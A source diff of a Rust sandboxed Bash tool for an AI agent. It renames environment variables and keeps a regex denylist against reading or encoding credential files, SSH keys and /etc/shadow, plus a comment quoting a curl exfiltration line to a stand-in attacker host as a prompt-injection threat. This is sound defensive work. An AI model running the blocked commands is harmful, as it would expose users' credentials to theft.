@@ -29,14 +29,14 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 /// **Env (D.1 Round 1 — HIGH-2):** BashTool historically copied the
 /// engine's *entire* host environment into the sandboxed child via
 /// `std::env::vars().collect()`. The engine process holds provider API
-/// keys, `WAYLAND_VAULT_PASSPHRASE`, cloud credentials, etc. in its env,
+/// keys, `GENESIS_VAULT_PASSPHRASE`, cloud credentials, etc. in its env,
 /// so that blanket copy handed every secret to every Bash command the
 /// model runs — a prompt-injected model could exfiltrate them around the
 /// string-pattern denylist. We now build a *curated* env via
 /// [`crate::env_passthrough::build_sandboxed_env`]: locale / terminal /
 /// toolchain-discovery vars (`PATH`, `HOME`, `LANG`, …) plus
 /// skill/config-declared passthrough vars, with every secret-shaped name
-/// (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `WAYLAND_VAULT_*`, …) dropped
+/// (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `GENESIS_VAULT_*`, …) dropped
 /// unconditionally. `PATH` etc. still pass through so commands work.
 ///
 /// **Network (M-3 / M-7 / sandbox-2 / tools-exec-15):** agent-initiated
@@ -45,7 +45,7 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 /// prompt-injected command (`curl --data-binary @secret https://attacker`)
 /// could exfiltrate any sandbox-readable data and reach internal/metadata
 /// endpoints even while FS/syscall confinement held. Egress is now opt-in:
-/// set `WAYLAND_BASH_ALLOW_NETWORK=1` to restore full host network for
+/// set `GENESIS_BASH_ALLOW_NETWORK=1` to restore full host network for
 /// network-dependent commands (`git fetch`, package installs, `curl`).
 ///
 /// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
@@ -70,7 +70,7 @@ fn build_sandbox_pieces(
     command: &str,
     policy: Option<&crate::workspace_policy::WorkspacePolicy>,
 ) -> (SandboxManifest, SandboxCommand) {
-    // Shell prefix honors the Windows WAYLAND_BASH_SHELL=powershell|pwsh override
+    // Shell prefix honors the Windows GENESIS_BASH_SHELL=powershell|pwsh override
     // (BashTool only); defaults to sh -c / cmd /C.
     let mut argv = bash_shell_argv_prefix();
     argv.push(command.to_string());
@@ -98,7 +98,7 @@ fn build_sandbox_pieces(
 /// assemblies that fail to load under the Low-integrity restricted token
 /// (`STATUS_DLL_NOT_FOUND`, 0xC0000135). When the active backend reports
 /// [`SandboxBackend::blocks_powershell`], a `powershell`/`pwsh` shell selection
-/// (via `WAYLAND_BASH_SHELL` / `[tools] windows_shell`) would make EVERY Bash
+/// (via `GENESIS_BASH_SHELL` / `[tools] windows_shell`) would make EVERY Bash
 /// command hard-fail. The shell is an implementation detail of "run this
 /// command", so downgrade the prefix to `cmd /C`, preserving the user's command,
 /// and warn once. See FerroxLabs/wayland#413.
@@ -122,7 +122,7 @@ fn downgrade_powershell_for_sandbox(argv: &mut Vec<String>, blocks_powershell: b
             target: "wcore_tools",
             "configured Bash shell is PowerShell, which cannot run under the active \
              sandbox (AppContainer Low-integrity token); falling back to `cmd /C`. \
-             Set `[tools] windows_shell = cmd` (or WAYLAND_BASH_SHELL=cmd) to silence this."
+             Set `[tools] windows_shell = cmd` (or GENESIS_BASH_SHELL=cmd) to silence this."
         );
     });
     *argv = vec!["cmd".to_string(), "/C".to_string(), command];
@@ -140,10 +140,10 @@ pub fn platform_enforces_read_deny() -> bool {
 }
 
 /// Network policy for agent-initiated Bash. Defaults to
-/// [`NetworkPolicy::Deny`]; `WAYLAND_BASH_ALLOW_NETWORK=1` opts back into
+/// [`NetworkPolicy::Deny`]; `GENESIS_BASH_ALLOW_NETWORK=1` opts back into
 /// full host network (`Inherit`) for network-dependent workflows.
 pub(crate) fn default_bash_network_policy() -> NetworkPolicy {
-    match std::env::var("WAYLAND_BASH_ALLOW_NETWORK") {
+    match std::env::var("GENESIS_BASH_ALLOW_NETWORK") {
         Ok(v) if v == "1" || v.eq_ignore_ascii_case("true") => NetworkPolicy::Inherit,
         _ => NetworkPolicy::Deny,
     }
@@ -251,7 +251,7 @@ fn annotate_network_block(
              network (that is why the output is empty). Do NOT retry with curl/wget. To \
              read a URL, use the WebFetch tool; to search the web, use the `web` tool with \
              operation \"search\". (To allow Bash network access, the user can set \
-             WAYLAND_BASH_ALLOW_NETWORK=1.)",
+             GENESIS_BASH_ALLOW_NETWORK=1.)",
         );
         result.is_error = true;
     }
@@ -311,11 +311,11 @@ fn denylist() -> &'static RegexSet {
             // rather than env-var-based — closes the gap where an
             // attacker `cat`s the on-disk secret instead of echoing
             // an env var.
-            r"(?i)\b(cat|less|more|head|tail|tee|bat)\b[^|;]*(\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/wayland/auth|/etc/shadow|/etc/sudoers)",
+            r"(?i)\b(cat|less|more|head|tail|tee|bat)\b[^|;]*(\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/genesis/auth|/etc/shadow|/etc/sudoers)",
             // Encoding-based exfil: base64/xxd/od/hexdump/uuencode of
             // credential files or .env. Closes the dodge where an
             // attacker base64s the secret to bypass a plain-read deny.
-            r"(?i)\b(base64|xxd|od|hexdump|uuencode|openssl\s+enc)\b[^|;]*(\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/wayland/auth|/etc/shadow|/etc/sudoers|\.env(\b|$))",
+            r"(?i)\b(base64|xxd|od|hexdump|uuencode|openssl\s+enc)\b[^|;]*(\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/genesis/auth|/etc/shadow|/etc/sudoers|\.env(\b|$))",
             // macOS Keychain extraction via `security` CLI.
             r"(?i)\bsecurity\s+(find-generic-password|find-internet-password|dump-keychain|export)\b",
             // `compgen -e` enumerates exported env vars in bash.
@@ -330,7 +330,7 @@ fn denylist() -> &'static RegexSet {
             // `set` is shadowed by an alias.
             r"(?i)^\s*set\s+-o\s+posix\s*;\s*set\s*$",
             // Reading our own credentials file by absolute path glob.
-            r"(?i)/wayland(-core)?/(auth|credentials|tokens?)\.json",
+            r"(?i)/genesis(-core)?/(auth|credentials|tokens?)\.json",
 
             // ── F-056: language-runtime eval patterns ──────────────────────
             // These allow a model to embed arbitrary code in the command arg
@@ -339,21 +339,21 @@ fn denylist() -> &'static RegexSet {
             // refusing all Python/Node use — only the dangerous combo.
 
             // python -c / python3 -c reading $HOME secret dirs.
-            r#"(?i)\bpython[23]?\s+-[cC]\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
+            r#"(?i)\bpython[23]?\s+-[cC]\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/genesis|/\.genesis)"#,
             // python -m pip show (fingerprints env / installed packages).
             r"(?i)\bpython[23]?\s+-m\s+pip\s+show\b",
             // node -e / node --eval reading $HOME secret dirs.
-            r#"(?i)\bnode\s+(--eval|-e)\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
+            r#"(?i)\bnode\s+(--eval|-e)\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/genesis|/\.genesis)"#,
             // perl -e reading $HOME secret dirs.
-            r#"(?i)\bperl\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
+            r#"(?i)\bperl\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/genesis|/\.genesis)"#,
             // ruby -e reading $HOME secret dirs.
-            r#"(?i)\bruby\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
+            r#"(?i)\bruby\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/genesis|/\.genesis)"#,
             // php -r reading $HOME secret dirs.
-            r#"(?i)\bphp\s+-r\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
+            r#"(?i)\bphp\s+-r\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/genesis|/\.genesis)"#,
             // awk ENVIRON — reads any env var via the language's env table.
             r"(?i)\bawk\b.*\bENVIRON\b",
             // bash -c ... $HOME reading cred dirs (shell inception with path).
-            r#"(?i)\bbash\s+-c\s+.*\$HOME[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
+            r#"(?i)\bbash\s+-c\s+.*\$HOME[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/genesis|/\.genesis)"#,
         ];
         // SAFETY: `patterns` is a static array of literal regex
         // strings exercised by the bash_credential_exfil_test suite
@@ -502,7 +502,7 @@ impl Tool for BashTool {
     async fn execute(&self, input: Value) -> ToolResult {
         // S9: buffered path now routes through the sandbox backend
         // (`SandboxBackend::execute`). On `NoSandboxBackend` (the default
-        // when no real sandbox is available, or `WAYLAND_SANDBOX=none`)
+        // when no real sandbox is available, or `GENESIS_SANDBOX=none`)
         // this is byte-identical to the pre-S9 `shell_command` path.
         let Some(command) = input["command"].as_str() else {
             return ToolResult {
@@ -892,8 +892,8 @@ mod tests {
         // isolation test, so opt into the documented no-sandbox degraded mode.
         // SAFETY: test-only env mutation; `#[serial]` prevents env races.
         unsafe {
-            std::env::set_var("WAYLAND_SANDBOX", "none");
-            std::env::set_var("WAYLAND_ALLOW_NO_SANDBOX", "1");
+            std::env::set_var("GENESIS_SANDBOX", "none");
+            std::env::set_var("GENESIS_ALLOW_NO_SANDBOX", "1");
         }
         let tool = BashTool;
         let input = json!({"command": "echo hello_bash"});
@@ -917,8 +917,8 @@ mod tests {
         // degraded mode so the exec actually runs where bwrap can't spawn.
         // SAFETY: test-only env mutation; `#[serial]` prevents env races.
         unsafe {
-            std::env::set_var("WAYLAND_SANDBOX", "none");
-            std::env::set_var("WAYLAND_ALLOW_NO_SANDBOX", "1");
+            std::env::set_var("GENESIS_SANDBOX", "none");
+            std::env::set_var("GENESIS_ALLOW_NO_SANDBOX", "1");
         }
         use std::sync::Mutex;
         struct Cap(Mutex<Vec<String>>);
@@ -1080,9 +1080,9 @@ mod tests {
         // Without the opt-in env var, agent-initiated Bash must default to
         // NetworkPolicy::Deny so a confined command cannot exfiltrate over
         // the network. (Env-var-free assertion: the test process does not
-        // set WAYLAND_BASH_ALLOW_NETWORK.)
+        // set GENESIS_BASH_ALLOW_NETWORK.)
         assert!(
-            std::env::var("WAYLAND_BASH_ALLOW_NETWORK").is_err(),
+            std::env::var("GENESIS_BASH_ALLOW_NETWORK").is_err(),
             "test env must not pre-set the opt-in var"
         );
         let (manifest, _cmd) = build_sandbox_pieces("echo hi", None);
@@ -1254,14 +1254,14 @@ mod tests {
     // customer's failing config), the real build path produces a powershell
     // prefix that CANNOT run under AppContainer; the downgrade swaps it to cmd
     // and the command actually runs with stdout captured. Gated behind
-    // WAYLAND_SANDBOX_LIVE_WINDOWS — runs only on a real Windows box.
+    // GENESIS_SANDBOX_LIVE_WINDOWS — runs only on a real Windows box.
     #[cfg(windows)]
     #[tokio::test(flavor = "current_thread")]
     async fn live_413_powershell_shell_falls_back_to_cmd() {
         use wcore_sandbox::backends::SandboxBackend;
         use wcore_sandbox::backends::appcontainer::AppContainerBackend;
 
-        if std::env::var("WAYLAND_SANDBOX_LIVE_WINDOWS").is_err() {
+        if std::env::var("GENESIS_SANDBOX_LIVE_WINDOWS").is_err() {
             return;
         }
         let backend = AppContainerBackend::new();
@@ -1272,9 +1272,9 @@ mod tests {
         assert!(backend.blocks_powershell());
 
         // Simulate the customer's config (`[tools] windows_shell = powershell`).
-        unsafe { std::env::set_var("WAYLAND_BASH_SHELL", "powershell") };
+        unsafe { std::env::set_var("GENESIS_BASH_SHELL", "powershell") };
         let (manifest, mut cmd) = build_sandbox_pieces("echo hello413", None);
-        unsafe { std::env::remove_var("WAYLAND_BASH_SHELL") };
+        unsafe { std::env::remove_var("GENESIS_BASH_SHELL") };
 
         // Pre-fix: the prefix is powershell, which would hard-fail under the sandbox.
         assert!(
@@ -1304,7 +1304,7 @@ mod tests {
         assert!(m.fs_write_allow.is_empty());
         assert_eq!(m.network, default_bash_network_policy());
         // Regression: argv must come from bash_shell_argv_prefix (honors the
-        // WAYLAND_BASH_SHELL Windows override), NOT from the hardcoded shell_info().
+        // GENESIS_BASH_SHELL Windows override), NOT from the hardcoded shell_info().
         #[cfg(unix)]
         assert_eq!(cmd.argv.first().map(|s| s.as_str()), Some("sh"));
     }
@@ -1344,8 +1344,8 @@ mod tests {
     async fn streaming_with_ctx_threads_workspace_policy_cwd() {
         // SAFETY: test-only env mutation; #[serial] prevents races.
         unsafe {
-            std::env::set_var("WAYLAND_SANDBOX", "none");
-            std::env::set_var("WAYLAND_ALLOW_NO_SANDBOX", "1");
+            std::env::set_var("GENESIS_SANDBOX", "none");
+            std::env::set_var("GENESIS_ALLOW_NO_SANDBOX", "1");
         }
         use crate::context::ToolContext;
         use crate::workspace_policy::WorkspacePolicy;
@@ -1432,7 +1432,7 @@ mod tests {
 
     // Live cwd/write behaviour requires a real sandbox backend. Ignored by
     // default (run manually on a host with sandbox-exec/bwrap). Under
-    // WAYLAND_SANDBOX=none the NoSandboxBackend honours cwd but NOT
+    // GENESIS_SANDBOX=none the NoSandboxBackend honours cwd but NOT
     // fs_write_allow/network, so this only proves cwd — kept as a manual smoke.
     #[tokio::test]
     #[ignore]
